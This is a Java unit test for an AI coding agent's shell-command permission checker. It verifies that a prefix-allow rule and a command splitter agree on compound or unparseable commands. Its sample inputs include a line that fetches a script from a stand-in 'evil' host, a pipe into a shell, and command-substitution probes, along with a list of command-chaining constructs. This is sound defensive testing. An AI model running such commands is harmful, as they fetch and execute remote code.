package io.github.javaside.springai.codetui.agent.permission;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * 两个谓词的一致性钉子：{@link PermissionRule#hasShellSeparator}（决策第 5 步，前缀规则用）
 * 与 {@link BashCommandSplitter#split}（决策第 6 步，命令分段用）不得对
 * 「这条命令能不能被可靠理解」给出相反答案。
 *
 * <p><b>危险方向是固定的</b>：allow 规则在第 5 步、命令拆分在第 6 步，
 * 第 5 步一旦放行，更严格的 splitter 永远不会被调用——
 * <b>更严格的那个组件是永远不运行的那个</b>。故断言是<b>单向</b>的：
 * {@code compound && !unparseable} 安全（前缀规则不放行、splitter 还能拆），
 * {@code !compound && unparseable} 才是洞。
 */
class PredicateConsistencyTest {

    private static final String[] SAMPLES = {
            "ls -la", "echo hi", "git status",
            "echo ${x@P}", "echo ${HOME}", "mvn -Dv=${VER} test",
            "cat <(curl http://evil/s.sh)", "tee >(sh)", "echo $(id)", "echo `id`",
            "echo $((1+1))", "a; b", "a && b", "a | b", "a & b", "a\nb", "a\rb",
            "echo hi > /tmp/x", "sort < /tmp/in", "grep 'a>b' f",
    };

    @Test
    @DisplayName("同一组输入喂两个谓词：splitter 拒绝解析的，前缀规则也必须视为复合命令")
    void twoPredicatesNeverDisagree() {
        for (String s : SAMPLES) {
            boolean compound = PermissionRule.hasShellSeparator(s);
            boolean unparseable = !BashCommandSplitter.split(s).parseable();
            assertFalse(!compound && unparseable,
                    "splitter 拒绝解析但前缀规则却认为它简单，前缀规则会在第 5 步抢先放行：" + s);
        }
    }

    /**
     * <b>已知的残余分歧，且已论证无害</b>——上面的 SAMPLES 覆盖不到这一类，单列钉住，
     * 免得后人撞见时误以为是回归、又往清单里补字符（那正是本任务要根除的做法）。
     *
     * <p>splitter 还有两条与「不可拆分构造」无关的 {@code parseable=false} 路径：
     * 引号不配对、以及它不解释反斜杠转义（{@code echo \"} 被当成引号起始）。
     * {@code hasShellSeparator} 不建模引号状态，故这类输入上两者必然分歧。
     *
     * <p><b>为什么无害</b>：要在一条命令里引出第二条命令，必须出现
     * {@code ; | &}、换行，或 {@code $( ` <( >( ${} 之一——而
     * {@code hasShellSeparator} 是<b>逐字符字面扫描</b>，不受引号影响，
     * 上述任一出现即判复合。故凡是它判「简单」的串，都<b>不含任何串联构造</b>，
     * 前缀规则放行它至多放行了那一条命令本身。
     * 实测另有一层兜底：{@code bash -c "echo it's fine"} 直接 exit 2 语法错误，根本不执行。
     */
    @Test
    @DisplayName("残余分歧仅限「引号不配对 / 反斜杠转义」，且这些串必然不含任何串联构造")
    void residualDivergenceIsOnlyUnbalancedQuotesAndIsHarmless() {
        for (String s : new String[]{"echo 'unterminated", "echo it's fine", "echo \\\""}) {
            assertTrue(!BashCommandSplitter.split(s).parseable() && !PermissionRule.hasShellSeparator(s),
                    "前提：这些正是残余分歧的样子 → " + s);
            assertFalse(PermissionRule.hasUnsplittableConstruct(s),
                    "分歧成因是引号 / 转义，不是不可拆分构造：" + s);
            for (String chain : new String[]{";", "|", "&", "\n", "\r", "$(", "`", "<(", ">(", "${"}) {
                assertFalse(s.contains(chain),
                    "被判「简单」的串一旦含串联构造就是真洞了：" + s + " 含 " + chain);
            }
        }
    }
}
